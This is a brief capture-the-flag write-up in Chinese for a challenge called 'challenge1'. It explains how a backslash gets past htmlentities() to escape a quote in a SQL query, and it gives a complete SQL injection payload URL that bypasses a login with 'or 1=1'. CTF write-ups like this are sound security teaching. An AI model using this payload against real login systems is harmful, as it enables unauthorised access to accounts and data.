## Writeup 
### challenge1:
htmlentities()转义了单引号和双引号，但是忽略了反斜线，所以可以用"\"将原SQL语句中的第二个单引号转义，成功逃逸引号，payload:http://foobar/index.php?username=\\&password=%20or%201=1%20limit%201%23
